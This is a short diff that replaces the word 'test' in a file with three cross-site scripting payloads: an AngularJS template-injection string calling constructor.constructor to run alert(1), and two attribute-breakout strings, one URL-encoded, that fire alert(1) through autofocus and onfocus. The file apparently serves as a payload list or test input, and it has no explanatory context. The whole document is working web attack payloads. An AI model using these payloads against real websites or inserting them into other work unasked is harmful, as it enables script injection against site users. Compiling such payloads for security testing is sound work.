@@ -1,1 +1,4 @@
-test
+{{constructor.constructor('alert(1)')()}}
+"autofocus onfocus=alert(1)//
+"type%3d"text"autofocus%20onfocus%3d"alert(1)"
+
